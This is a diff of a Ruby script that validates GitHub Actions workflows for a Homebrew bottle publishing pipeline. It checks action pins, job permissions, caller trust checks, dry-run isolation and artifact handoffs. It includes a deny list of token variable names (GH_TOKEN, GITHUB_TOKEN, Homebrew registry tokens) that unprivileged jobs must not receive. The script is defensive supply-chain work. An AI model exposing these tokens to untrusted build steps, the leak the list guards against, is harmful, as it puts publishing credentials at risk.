@@ -8,6 +8,19 @@ require "yaml"
 REPO_ROOT = File.expand_path("..", __dir__)
 PUBLISHER_PATH = File.join(REPO_ROOT, ".github/workflows/reusable-homebrew-bottle-publish.yml")
 MAINTENANCE_PATH = File.join(REPO_ROOT, ".github/workflows/reusable-homebrew-bottle-maintenance.yml")
+CHECKOUT_ACTION = "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd"
+NIX_ACTION = "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25"
+MAGIC_NIX_ACTION = "DeterminateSystems/magic-nix-cache-action@908b263ff629f4cc17666315b7fd3ec127c6244d"
+UPLOAD_ACTION = "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"
+DOWNLOAD_ACTION = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c"
+BREW_COMMIT = "34c40c18ffa2029b611b61c73273e32c003d0842"
+PUBLISHER_PLAN_DIGEST = "5724fbd09d7c43ba63c5bfa58cb4e73d7f0c08247b029b49a3e4e940d0011bd5"
+PUBLISHER_BUILD_DIGEST = "7c4141acf50a353846fc87c9a8a9928efb5ba717e25793908f14c31b96045022"
+PUBLISHER_UPLOAD_DIGEST = "60a32b6c315cfbaa5b4035c67f1cbb76d17b17a6e20c4f3e06d72aa66af456bd"
+PUBLISHER_VERIFY_DIGEST = "2f1a0c6e76d6741f96a067f4f6a45daef3555e2fb20ff79dfdf083cd69f6e924"
+PUBLISHER_FINALIZE_DIGEST = "808e283806190e29b42c8a88db8db43af67d9100af84063ea486fe33205eb839"
+MAINTENANCE_VALIDATE_DIGEST = "9ab856fe40640172500d82b5179a096aa028763bf696aeac865d732298617a22"
+MAINTENANCE_ROLLBACK_DIGEST = "45ff220697da9604dbe69c82761f285ba2e3e5182ef0819360128b82dd169efc"
 
 def check(condition, message)
   raise message unless condition
@@ -55,18 +68,8 @@ def canonical_contract(value)
   end
 end
 
-def step_contract_digest(steps)
-  Digest::SHA256.hexdigest(JSON.generate(canonical_contract(steps)))
-end
-
-def expect_rejection(label)
-  rejected = false
-  begin
-    yield
-  rescue KeyError, RuntimeError
-    rejected = true
-  end
-  check(rejected, "self-test accepted #{label}")
+def contract_digest(value)
+  Digest::SHA256.hexdigest(JSON.generate(canonical_contract(value)))
 end
 
 def workflow_jobs(workflow)
@@ -75,17 +78,17 @@ def workflow_jobs(workflow)
   jobs
 end
 
-def job_steps(job, name)
+def job_steps(job, label)
   steps = job["steps"]
-  check(steps.is_a?(Array), "#{name} steps: value is not an array")
-  check(steps.all? { |step| step.is_a?(Hash) }, "#{name} contains a non-mapping step")
+  check(steps.is_a?(Array), "#{label} steps: value is not an array")
+  check(steps.all? { |step| step.is_a?(Hash) }, "#{label} contains a non-mapping step")
   steps
 end
 
-def workflow_steps(workflow)
-  workflow_jobs(workflow).values.flat_map do |job|
-    job.is_a?(Hash) && job["steps"].is_a?(Array) ? job["steps"] : []
-  end
+def named_step(steps, name)
+  matches = steps.select { |step| step["name"] == name }
+  check(matches.length == 1, "expected exactly one #{name.inspect} step")
+  matches.first
 end
 
 def exact_permissions?(actual, expected)
@@ -113,24 +116,22 @@ def check_common(workflow, label)
 end
 
 def check_publisher(workflow)
-  top_level_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
-  check(top_level_keys == %w[concurrency jobs name on],
+  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
+  check(top_keys == %w[concurrency jobs name on],
         "publisher has unexpected top-level configuration")
   check(workflow["name"] == "Reusable Kandelo Homebrew bottle publish",
         "publisher name changed")
-  expected_concurrency = {
+  check(workflow["concurrency"] == {
     "group" => "kandelo-homebrew-bottle-publish-${{ inputs.tap-repository }}-" \
                "${{ inputs.release-tag || github.run_id }}",
     "cancel-in-progress" => false,
-  }
-  check(workflow["concurrency"] == expected_concurrency,
-        "publisher concurrency contract changed")
+  }, "publisher concurrency contract changed")
 
   events = workflow_events(workflow)
   check(events.keys == ["workflow_call"], "publisher must only expose workflow_call")
   workflow_call = events.fetch("workflow_call")
   check(workflow_call.keys == ["inputs"], "publisher workflow_call contract changed")
-  expected_inputs = {
+  check(workflow_call["inputs"] == {
     "kandelo-repository" => { "type" => "string", "default" => "Automattic/kandelo" },
     "kandelo-ref" => { "type" => "string", "default" => "main" },
     "tap-repository" => { "type" => "string", "default" => "Automattic/kandelo-homebrew" },
@@ -139,225 +140,485 @@ def check_publisher(workflow)
     "arches" => { "type" => "string", "default" => "wasm32" },
     "release-tag" => { "type" => "string", "default" => "" },
     "bottle-root-url" => { "type" => "string", "default" => "" },
-    "sidecar-command" => {
-      "type" => "string",
-      "default" => "bash scripts/homebrew-generate-sidecars-from-env.sh",
-    },
     "expected-cache-keys" => { "type" => "string", "default" => "" },
     "force" => { "type" => "boolean", "default" => false },
-    "repair-only" => { "type" => "boolean", "default" => false },
     "dry-run" => { "type" => "boolean", "default" => false },
-  }
-  check(workflow_call["inputs"] == expected_inputs, "publisher inputs changed")
-
-  jobs = workflow_jobs(workflow)
-  check(jobs.keys.sort == %w[build-and-publish plan], "publisher has an unexpected job set")
-  check(jobs.fetch("plan").keys.sort == %w[outputs runs-on steps],
-        "publisher plan execution contract changed")
-  check(jobs.fetch("plan")["runs-on"] == "ubuntu-latest",
-        "publisher plan runner trust boundary changed")
-  check(jobs.fetch("build-and-publish").keys.sort ==
-        %w[if needs runs-on steps strategy timeout-minutes],
-        "publisher build execution contract changed")
-  check(!workflow.key?("permissions"), "reusable publisher requests workflow permissions")
-  check(jobs.values.none? { |job| job.is_a?(Hash) && job.key?("permissions") },
-        "reusable publisher requests job permissions")
+  }, "publisher inputs changed")
+  check(!workflow.key?("permissions"), "publisher requests workflow-wide permissions")
   check_common(workflow, "reusable publisher")
 
-  plan_steps = job_steps(jobs.fetch("plan"), "publisher plan")
-  check(step_contract_digest(plan_steps) ==
-        "7602b0626e66888f9e26ace944244608d77d01c2cdcf1f960eb21b5555f72119",
-        "publisher plan step contract changed")
-  validation_index = plan_steps.index { |step| step["name"] == "Validate caller trust boundary" }
-  checkout_indices = plan_steps.each_index.select do |index|
-    plan_steps[index]["uses"].to_s.downcase.start_with?("actions/checkout@")
-  end
-  check(validation_index == 0, "publisher trust validation must be the first plan step")
-  check(!checkout_indices.empty? && validation_index < checkout_indices.min,
-        "publisher does not validate caller trust before checkout")
+  jobs = workflow_jobs(workflow)
+  check(jobs.keys.sort == %w[build-and-test finalize-tap plan upload-bottle verify-bottle],
+        "publisher has an unexpected job set")
+  plan = jobs.fetch("plan")
+  build = jobs.fetch("build-and-test")
+  upload = jobs.fetch("upload-bottle")
+  verify = jobs.fetch("verify-bottle")
+  finalize = jobs.fetch("finalize-tap")
 
-  validation = plan_steps.fetch(validation_index)
-  validation_env = validation["env"]
-  check(validation_env.is_a?(Hash), "publisher trust validation lacks an env mapping")
-  expected_validation_env = {
-    "DRY_RUN" => "${{ inputs.dry-run }}",
-    "KANDELO_REPOSITORY" => "${{ inputs.kandelo-repository }}",
-    "KANDELO_REF" => "${{ inputs.kandelo-ref }}",
-    "TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
-    "TAP_REF" => "${{ inputs.tap-ref }}",
-    "BOTTLE_ROOT_URL" => "${{ inputs.bottle-root-url }}",
-    "SIDECAR_COMMAND" => "${{ inputs.sidecar-command }}",
+  check(plan.keys.sort == %w[outputs permissions runs-on steps],
+        "publisher plan contract changed")
+  %w[build-and-test upload-bottle verify-bottle finalize-tap].each do |job_name|
+    check(jobs.fetch(job_name).keys.sort ==
+          %w[if needs permissions runs-on steps strategy timeout-minutes],
+          "publisher #{job_name} job contract changed")
+  end
+  check(plan["runs-on"] == "ubuntu-latest" &&
+        exact_permissions?(plan["permissions"], { "contents" => "read" }),
+        "publisher plan authority changed")
+  check(build["runs-on"] == "ubuntu-latest" && build["timeout-minutes"] == 1440 &&
+        exact_permissions?(build["permissions"], { "contents" => "read", "actions" => "read" }),
+        "publisher build authority changed")
+  check(upload["runs-on"] == "ubuntu-latest" && upload["timeout-minutes"] == 60 &&
+        exact_permissions?(upload["permissions"], {
+          "actions" => "read", "contents" => "read", "packages" => "write",
+        }), "publisher uploader authority changed")
+  check(verify["runs-on"] == "ubuntu-latest" && verify["timeout-minutes"] == 1440 &&
+        exact_permissions?(verify["permissions"], { "actions" => "read", "contents" => "read" }),
+        "publisher verifier authority changed")
+  check(finalize["runs-on"] == "ubuntu-latest" && finalize["timeout-minutes"] == 120 &&
+        exact_permissions?(finalize["permissions"], { "actions" => "read", "contents" => "write" }),
+        "publisher finalizer authority changed")
+
+  matrix_strategy = {
+    "fail-fast" => false,
+    "matrix" => { "include" => "${{ fromJson(needs.plan.outputs.matrix) }}" },
   }
-  check(validation.keys.sort == %w[env name run shell] &&
-        validation["name"] == "Validate caller trust boundary" &&
-        validation["shell"] == "bash" &&
-        validation_env == expected_validation_env,
-        "publisher trust validation step mapping changed")
-  validation_run = validation["run"].to_s
-  check(Digest::SHA256.hexdigest(validation_run) ==
-        "c946d88dc5265d23d67641d11598960e241f7677fe2b4d035b14d3c65fde4c06",
-        "publisher trust validation script changed")
-  check(validation_run.include?('[ "$KANDELO_REF" = "main" ]'),
-        "publisher does not constrain write publication to Kandelo main")
-  check(validation_run.include?('[ "$TAP_REF" = "main" ]'),
-        "publisher does not constrain write publication to tap main")
-  check(validation_run.include?('[ "$DRY_RUN" = "true" ]'),
-        "publisher does not isolate the selected-ref dry-run path")
-  required_predicates = [
+  [build, upload, verify, finalize].each do |job|
+    check(job["strategy"] == matrix_strategy,
+          "publisher execution job bypasses the validated matrix")
+  end
+  check(build["needs"] == ["plan"] &&
+        build["if"] == "${{ needs.plan.outputs.matrix != '[]' }}",
+        "publisher build graph changed")
+  check(upload["needs"] == %w[plan build-and-test] &&
+        upload["if"] == "${{ always() && !cancelled() && !inputs.dry-run && " \
+                         "needs.plan.result == 'success' && needs.plan.outputs.matrix != '[]' }}",
+        "publisher upload graph or dry-run isolation changed")
+  check(verify["needs"] == %w[plan build-and-test upload-bottle] &&
+        verify["if"] == "${{ always() && !cancelled() && needs.plan.result == 'success' && " \
+                         "needs.plan.outputs.matrix != '[]' }}",
+        "publisher verification graph changed")
+  check(finalize["needs"] == %w[plan build-and-test upload-bottle verify-bottle] &&
+        finalize["if"] == "${{ always() && !cancelled() && !inputs.dry-run && " \
+                           "needs.plan.result == 'success' && needs.plan.outputs.matrix != '[]' }}",
+        "publisher finalization graph or dry-run isolation changed")
+
+  plan_steps = job_steps(plan, "publisher plan")
+  build_steps = job_steps(build, "publisher build")
+  upload_steps = job_steps(upload, "publisher upload")
+  verify_steps = job_steps(verify, "publisher verification")
+  finalize_steps = job_steps(finalize, "publisher finalization")
+
+  validation = named_step(plan_steps, "Validate caller trust boundary")
+  check(plan_steps.first.equal?(validation), "publisher trust validation must be first")
+  check(validation.keys.sort == %w[env name run shell] && validation["shell"] == "bash" &&
+        validation["env"] == {
+          "CALLER_EVENT_NAME" => "${{ github.event_name }}",
+          "CALLER_REF" => "${{ github.ref }}",
+          "CALLER_REPOSITORY" => "${{ github.repository }}",
+          "CALLER_WORKFLOW_REF" => "${{ github.workflow_ref }}",
+          "DRY_RUN" => "${{ inputs.dry-run }}",
+          "KANDELO_REPOSITORY" => "${{ inputs.kandelo-repository }}",
+          "KANDELO_REF" => "${{ inputs.kandelo-ref }}",
+          "TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
+          "TAP_REF" => "${{ inputs.tap-ref }}",
+          "BOTTLE_ROOT_URL" => "${{ inputs.bottle-root-url }}",
+        }, "publisher caller validation mapping changed")
+  validation_run = validation.fetch("run")
+  [
+    '[ "$CALLER_REPOSITORY" = "Automattic/kandelo-homebrew" ]',
+    '[ "$CALLER_REF" = "refs/heads/main" ]',
+    '[ "$CALLER_EVENT_NAME" = "repository_dispatch" ]',
+    "dry-run-bottles.yml@refs/heads/main",
+    "publish-bottles.yml@refs/heads/main",
+    "maintain-bottles.yml@refs/heads/main",
     '[ "$KANDELO_REPOSITORY" = "Automattic/kandelo" ]',
+    '[ "$KANDELO_REF" = "main" ]',
     '[ "$TAP_REPOSITORY" = "Automattic/kandelo-homebrew" ]',
+    '[ "$TAP_REF" = "main" ]',
     '[ -z "$BOTTLE_ROOT_URL" ]',
-    '[ "$SIDECAR_COMMAND" = "bash scripts/homebrew-generate-sidecars-from-env.sh" ]',
-  ]
-  required_predicates.each do |predicate|
-    check(validation_run.include?(predicate), "publisher trust validation lacks #{predicate}")
+  ].each do |predicate|
+    check(validation_run.include?(predicate), "publisher caller validation lacks #{predicate}")
   end
+  dry_index = validation_run.index('if [ "$DRY_RUN" = "true" ]')
+  caller_index = validation_run.index('[ "$CALLER_REF" = "refs/heads/main" ]')
+  check(dry_index && caller_index && caller_index < dry_index,
+        "publisher dry-run can bypass caller authority validation")
 
-  expected_uses = [
-    *Array.new(4, "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd"),
-    "Homebrew/actions/setup-homebrew@1f8e202ffddf94def7f42f6fa3a482e821489f9c",
-    "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25",
-    "DeterminateSystems/magic-nix-cache-action@908b263ff629f4cc17666315b7fd3ec127c6244d",
-    "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
-  ].sort
-  check(values_for_key(workflow, "uses").sort == expected_uses,
-        "publisher action set or pin changed")
-
-  publisher_steps = workflow_steps(workflow)
-  homebrew_steps = publisher_steps.select do |step|
-    step["uses"] == "Homebrew/actions/setup-homebrew@1f8e202ffddf94def7f42f6fa3a482e821489f9c"
-  end
-  expected_homebrew_step = {
-    "name" => "Install Homebrew",
-    "uses" => "Homebrew/actions/setup-homebrew@1f8e202ffddf94def7f42f6fa3a482e821489f9c",
-  }
-  check(homebrew_steps == [expected_homebrew_step],
-        "Homebrew setup action mapping changed")
-
-  nix_steps = publisher_steps.select do |step|
-    step["uses"] == "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25"
-  end
-  expected_nix_step = {
-    "name" => "Install Nix",
-    "uses" => "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25",
-    "with" => { "github-token" => "" },
-  }
-  check(nix_steps == [expected_nix_step], "Nix installer action mapping changed")
-
-  magic_steps = publisher_steps.select do |step|
-    step["uses"] == "DeterminateSystems/magic-nix-cache-action@908b263ff629f4cc17666315b7fd3ec127c6244d"
-  end
-  expected_magic_step = {
-    "name" => "Cache Nix store + flake eval",
-    "uses" => "DeterminateSystems/magic-nix-cache-action@908b263ff629f4cc17666315b7fd3ec127c6244d",
-    "with" => { "use-gha-cache" => false, "use-flakehub" => false },
-  }
-  check(magic_steps == [expected_magic_step], "Magic Nix action mapping changed")
-
-  expected_outputs = {
+  release_run = named_step(plan_steps, "Resolve release and bottle root").fetch("run")
+  check(release_run.include?('expected_release_tag="bottles-abi-v${abi}"') &&
+        release_run.include?('[ "$release_tag" != "$expected_release_tag" ]'),
+        "publisher does not bind release tag exactly to the resolved ABI")
+  check(plan["outputs"] == {
     "matrix" => "${{ steps.matrix.outputs.matrix }}",
     "abi" => "${{ steps.release.outputs.abi }}",
     "release-tag" => "${{ steps.release.outputs.release-tag }}",
     "bottle-root-prefix" => "${{ steps.release.outputs.bottle-root-prefix }}",
     "kandelo-sha" => "${{ steps.source-commits.outputs.kandelo-sha }}",
     "tap-sha" => "${{ steps.source-commits.outputs.tap-sha }}",
-  }
-  check(jobs.fetch("plan")["outputs"] == expected_outputs, "publisher plan outputs changed")
-  build = jobs.fetch("build-and-publish")
-  check(build["runs-on"] == "ubuntu-latest" && build["timeout-minutes"] == 1440,
-        "publisher build runner or timeout changed")
-  check(build["needs"] == ["plan"], "publisher build does not depend exactly on plan")
-  check(build["if"] == "${{ needs.plan.outputs.matrix != '[]' }}",
-        "publisher build condition bypasses the validated matrix")
-  expected_strategy = {
-    "fail-fast" => false,
-    "matrix" => { "include" => "${{ fromJson(needs.plan.outputs.matrix) }}" },
-  }
-  check(build["strategy"] == expected_strategy,
-        "publisher build strategy bypasses the validated plan output")
-  build_steps = job_steps(build, "publisher build")
-  check(step_contract_digest(build_steps) ==
-        "23990a135f89246de344363ba915cb427d0afce02a29b1db7011b2f064f924c8",
-        "publisher build step contract changed")
+  }, "publisher plan outputs changed")
 
-  plan_checkouts = plan_steps.select do |step|
-    step["uses"].to_s.downcase.start_with?("actions/checkout@")
-  end.map { |step| { "name" => step["name"], "with" => step["with"] } }
-  expected_plan_checkouts = [
+  expected_uses = [
+    *Array.new(13, CHECKOUT_ACTION),
+    *Array.new(4, NIX_ACTION),
+    *Array.new(2, MAGIC_NIX_ACTION),
+    *Array.new(5, UPLOAD_ACTION),
+    *Array.new(4, DOWNLOAD_ACTION),
+  ].sort
+  check(values_for_key(workflow, "uses").sort == expected_uses,
+        "publisher action set or pin changed")
+
+  checkout_view = lambda do |steps|
+    steps.select { |step| step["uses"] == CHECKOUT_ACTION }.map do |step|
+      { "name" => step["name"], "if" => step["if"], "with" => step["with"] }
+    end
+  end
+  check(checkout_view.call(plan_steps) == [
     {
-      "name" => "Checkout Kandelo workflow source",
+      "name" => "Checkout Kandelo workflow source", "if" => nil,
       "with" => {
+        "persist-credentials" => false,
         "repository" => "${{ inputs.kandelo-repository }}",
-        "ref" => "${{ inputs.kandelo-ref }}",
-        "path" => "kandelo",
-        "submodules" => false,
+        "ref" => "${{ inputs.kandelo-ref }}", "path" => "kandelo", "submodules" => false,
       },
     },
     {
-      "name" => "Checkout tap",
+      "name" => "Checkout tap", "if" => nil,
       "with" => {
+        "persist-credentials" => false,
         "repository" => "${{ inputs.tap-repository }}",
-        "ref" => "${{ inputs.tap-ref }}",
-        "path" => "tap",
+        "ref" => "${{ inputs.tap-ref }}", "path" => "tap",
       },
     },
-  ]
-  check(plan_checkouts == expected_plan_checkouts, "publisher plan checkout wiring changed")
-
-  source_commit_steps = plan_steps.select { |step| step["name"] == "Resolve source commits" }
-  check(source_commit_steps.length == 1, "publisher must resolve source commits exactly once")
-  source_commit_step = source_commit_steps.first
-  check(source_commit_step.keys.sort == %w[id name run shell] &&
-        source_commit_step["id"] == "source-commits" &&
-        source_commit_step["shell"] == "bash" &&
-        Digest::SHA256.hexdigest(source_commit_step["run"].to_s) ==
-          "c05aa8d02adf2380b8acf8dcb3a7e27341660cefe7600bb8d944daf384d83248",
-        "publisher source-commit resolution changed")
-
-  build_checkouts = build_steps.select do |step|
-    step["uses"].to_s.downcase.start_with?("actions/checkout@")
-  end.map { |step| { "name" => step["name"], "with" => step["with"] } }
-  expected_build_checkouts = [
+  ], "publisher plan checkout wiring changed")
+  check(checkout_view.call(build_steps) == [
     {
-      "name" => "Checkout tap",
+      "name" => "Checkout Kandelo workflow source", "if" => nil,
       "with" => {
-        "repository" => "${{ inputs.tap-repository }}",
-        "ref" => "${{ needs.plan.outputs.tap-sha }}",
-        "path" => "tap",
-      },
-    },
-    {
-      "name" => "Checkout Kandelo workflow source",
-      "with" => {
+        "persist-credentials" => false,
         "repository" => "${{ inputs.kandelo-repository }}",
         "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
-        "path" => "kandelo",
-        "submodules" => false,
+        "path" => "kandelo", "submodules" => false,
       },
     },
+    {
+      "name" => "Checkout tap", "if" => nil,
+      "with" => {
+        "persist-credentials" => false,
+        "repository" => "${{ inputs.tap-repository }}",
+        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap",
+      },
+    },
+    {
+      "name" => "Checkout reviewed Homebrew implementation", "if" => nil,
+      "with" => {
+        "persist-credentials" => false, "repository" => "Homebrew/brew",
+        "ref" => BREW_COMMIT, "path" => "homebrew-prefix/Homebrew",
+      },
+    },
+  ], "publisher build checkout wiring changed")
+  check(checkout_view.call(upload_steps) == [
+    {
+      "name" => "Checkout exact Kandelo validator source", "if" => nil,
+      "with" => {
+        "persist-credentials" => false,
+        "repository" => "${{ inputs.kandelo-repository }}",
+        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
+        "path" => "kandelo", "submodules" => false,
+      },
+    },
+  ], "publisher uploader checkout wiring changed")
+  check(checkout_view.call(verify_steps) == [
+    {
+      "name" => "Checkout exact Kandelo verifier source", "if" => nil,
+      "with" => {
+        "persist-credentials" => false,
+        "repository" => "${{ inputs.kandelo-repository }}",
+        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
+        "path" => "kandelo", "submodules" => false,
+      },
+    },
+    {
+      "name" => "Checkout exact tap source", "if" => nil,
+      "with" => {
+        "persist-credentials" => false,
+        "repository" => "${{ inputs.tap-repository }}",
+        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap",
+      },
+    },
+    {
+      "name" => "Checkout reviewed Homebrew implementation", "if" => nil,
+      "with" => {
+        "persist-credentials" => false, "repository" => "Homebrew/brew",
+        "ref" => BREW_COMMIT, "path" => "homebrew-prefix/Homebrew",
+      },
+    },
+  ], "publisher verifier checkout wiring changed")
+
+  failure_condition = "${{ always() && (steps.publish-handoff.outcome != 'success' || " \
+                      "steps.validate-payload.outcome != 'success' || steps.publish.outcome != 'success') }}"
+  check(checkout_view.call(finalize_steps) == [
+    {
+      "name" => "Checkout exact Kandelo finalizer source", "if" => nil,
+      "with" => {
+        "persist-credentials" => false,
+        "repository" => "${{ inputs.kandelo-repository }}",
+        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
+        "path" => "kandelo", "submodules" => false,
+      },
+    },
+    {
+      "name" => "Checkout exact base tap without credentials", "if" => nil,
+      "with" => {
+        "persist-credentials" => false,
+        "repository" => "${{ inputs.tap-repository }}",
+        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap-base",
+      },
+    },
+    {
+      "name" => "Checkout tap publication branch after payload validation",
+      "if" => "${{ steps.validate-payload.outcome == 'success' }}",
+      "with" => {
+        "repository" => "${{ inputs.tap-repository }}", "ref" => "main",
+        "path" => "tap-publish", "fetch-depth" => 0,
+      },
+    },
+    {
+      "name" => "Checkout clean tap for a failed-attempt report", "if" => failure_condition,
+      "with" => {
+        "repository" => "${{ inputs.tap-repository }}", "ref" => "main",
+        "path" => "tap-report", "fetch-depth" => 0,
+      },
+    },
+  ], "publisher finalizer checkout wiring changed")
+
+  credential_names = %w[
+    GH_TOKEN GITHUB_TOKEN HOMEBREW_GITHUB_API_TOKEN HOMEBREW_GITHUB_PACKAGES_TOKEN
+    HOMEBREW_DOCKER_REGISTRY_TOKEN
   ]
-  check(build_checkouts == expected_build_checkouts, "publisher build checkout wiring changed")
+  [build_steps, verify_steps].each do |steps|
+    exposed = steps.flat_map { |step| step.fetch("env", {}).keys & credential_names }
+    check(exposed.empty?, "unprivileged publisher phase exposes a credential environment")
+    check(steps.select { |step| step["uses"] == CHECKOUT_ACTION }.all? do |step|
+      step.dig("with", "persist-credentials") == false
+    end, "unprivileged publisher phase persists checkout credentials")
+  end
+  uploader_credential_steps = upload_steps.select do |step|
+    !(step.fetch("env", {}).keys & credential_names).empty?
+  end
+  check(uploader_credential_steps.map { |step| step["name"] } ==
+        ["Upload validated bottle in isolated ORAS auth state"] &&
+        uploader_credential_steps.first["env"] == { "GH_TOKEN" => "${{ github.token }}" },
+        "publisher uploader credentials escape the isolated upload step")
+  finalizer_credential_steps = finalize_steps.select do |step|
+    !(step.fetch("env", {}).keys & credential_names).empty?
+  end
+  check(finalizer_credential_steps.map { |step| step["name"] } == [
+    "Publish validated sidecars under the tap state lock",
+    "Record failed attempt without replacing last-green metadata",
+  ] && finalizer_credential_steps.all? do |step|
+    step.fetch("env").slice(*credential_names) == { "GH_TOKEN" => "${{ github.token }}" }
+  end, "publisher finalizer credentials escape tap write steps")
+
+  build_handoff_name =
+    "homebrew-build-handoff-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
+  upload_receipt_name =
+    "homebrew-upload-receipt-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
+  publish_handoff_name =
+    "homebrew-publish-handoff-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
+  build_handoff_upload = named_step(build_steps, "Upload strict bottle build handoff")
+  check(build_handoff_upload["uses"] == UPLOAD_ACTION && build_handoff_upload["with"] == {
+    "name" => build_handoff_name,
+    "path" => "${{ runner.temp }}/homebrew-build-handoff",
+    "if-no-files-found" => "error", "retention-days" => 2,
+  }, "publisher build handoff artifact contract changed")
+  upload_handoff_download = named_step(upload_steps, "Download strict build handoff")
+  verify_handoff_download = named_step(verify_steps, "Download strict build handoff")
+  [upload_handoff_download, verify_handoff_download].each do |step|
+    check(step["uses"] == DOWNLOAD_ACTION && step["id"] == "build-handoff" &&
+          step["continue-on-error"] == true && step["with"] == {
+            "name" => build_handoff_name,
+            "path" => "${{ runner.temp }}/homebrew-build-handoff",
+          }, "publisher build handoff download contract changed")
+  end
+  receipt_upload = named_step(upload_steps, "Upload strict upload receipt")
+  check(receipt_upload["uses"] == UPLOAD_ACTION && receipt_upload["with"] == {
+    "name" => upload_receipt_name,
+    "path" => "${{ runner.temp }}/homebrew-upload-receipt/receipt.json",
+    "if-no-files-found" => "error", "retention-days" => 2,
+  }, "publisher upload receipt artifact contract changed")
+  receipt_download = named_step(verify_steps, "Download strict upload receipt")
+  check(receipt_download["uses"] == DOWNLOAD_ACTION && receipt_download["id"] == "upload-receipt" &&
+        receipt_download["if"] == "${{ !inputs.dry-run }}" &&
+        receipt_download["continue-on-error"] == true && receipt_download["with"] == {
+          "name" => upload_receipt_name,
+          "path" => "${{ runner.temp }}/homebrew-upload-receipt",
+        }, "publisher receipt download contract changed")
+  publish_handoff_upload = named_step(verify_steps, "Upload validated publication handoff")
+  check(publish_handoff_upload["uses"] == UPLOAD_ACTION && publish_handoff_upload["with"] == {
+    "name" => publish_handoff_name,
+    "path" => "${{ runner.temp }}/homebrew-publish-handoff",
+    "if-no-files-found" => "error", "retention-days" => 2,
+  }, "publisher publication handoff artifact contract changed")
+  publish_handoff_download = named_step(finalize_steps, "Download validated publication handoff")
+  check(publish_handoff_download["uses"] == DOWNLOAD_ACTION &&
+        publish_handoff_download["id"] == "publish-handoff" &&
+        publish_handoff_download["continue-on-error"] == true &&
+        publish_handoff_download["with"] == {
+          "name" => publish_handoff_name,
+          "path" => "${{ runner.temp }}/homebrew-publish-handoff",
+        }, "publisher publication handoff download contract changed")
+
+  build_run = named_step(build_steps,
+                         "Build and test Homebrew bottle without publisher credentials").fetch("run")
+  check(build_run.include?("unprivileged bottle build received $secret_name") &&
+        build_run.include?("scripts/homebrew-bottle-build.sh"),
+        "publisher build phase no longer rejects credentials or uses the reviewed builder")
+  create_handoff_run = named_step(build_steps, "Create strict bottle data handoff").fetch("run")
+  [
+    "scripts/homebrew-create-build-handoff.sh", '--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"',
+    '--bottle "$BOTTLE_ARCHIVE"', '--bottle-json "$BOTTLE_JSON"',
+    '--out "$RUNNER_TEMP/homebrew-build-handoff"',
+  ].each do |fragment|
+    check(create_handoff_run.include?(fragment), "publisher build handoff lacks #{fragment}")
+  end
+
+  upload_validate = named_step(upload_steps,
+                               "Validate build data before exposing upload credentials")
+  upload_attempt = named_step(upload_steps, "Upload validated bottle in isolated ORAS auth state")
+  check(upload_validate["id"] == "validate-build" &&
+        upload_attempt["if"] == "${{ steps.validate-build.outcome == 'success' }}" &&
+        upload_steps.index(upload_validate) < upload_steps.index(upload_attempt),
+        "publisher exposes upload credentials before validating the handoff")
+  check(upload_validate.fetch("run").include?("scripts/homebrew-validate-build-handoff.sh") &&
+        upload_validate.fetch("run").include?('--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"') &&
+        upload_attempt.fetch("run").include?("scripts/homebrew-ghcr-upload.sh") &&
+        upload_attempt.fetch("run").include?('--out-json "$RUNNER_TEMP/homebrew-upload-receipt/receipt.json"'),
+        "publisher isolated upload path changed")
+  check(upload_steps.none? { |step| step["name"].to_s.downcase.include?("diagnostic") } &&
+        upload_steps.count { |step| step["uses"] == UPLOAD_ACTION } == 1,
+        "credentialed uploader publishes diagnostics")
+
+  canonical_build = named_step(verify_steps,
+                               "Validate build handoff and reconstruct canonical bottle JSON").fetch("run")
+  canonical_receipt = named_step(verify_steps,
+                                 "Validate receipt against exact bottle bytes").fetch("run")
+  [canonical_build, canonical_receipt].each do |run|
+    check(run.include?('--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"') &&
+          run.include?('--out-bottle-json "$RUNNER_TEMP/homebrew-verified-input/bottle.json"'),
+          "publisher does not reconstruct canonical bottle JSON")
+  end
+  merge_run = named_step(verify_steps,
+                         "Merge only reconstructed bottle metadata into the fresh tap").fetch("run")
+  [
+    "scripts/homebrew-merge-bottle-json.sh", '--bottle-json "$BOTTLE_JSON"',
+    '--expected-sha256 "$BOTTLE_SHA256"', '--expected-root-url "$BOTTLE_ROOT_URL"',
+    '[ "$changed" = "Formula/$FORMULA.rb" ]',
+  ].each do |fragment|
+    check(merge_run.include?(fragment), "publisher canonical bottle merge lacks #{fragment}")
+  end
+
+  anonymous_run = named_step(verify_steps,
+                             "Select exact anonymous bottle bytes for runtime validation").fetch("run")
+  [
+    "scripts/homebrew-verify-public-bottle.ts", '--url "$BOTTLE_URL"',
+    '--sha256 "$BOTTLE_SHA256"', '--bytes "$BOTTLE_BYTES"', '--out "$runtime_bottle"',
+    'actual_sha="$(sha256sum "$runtime_bottle"',
+  ].each do |fragment|
+    check(anonymous_run.include?(fragment), "publisher anonymous bottle readback lacks #{fragment}")
+  end
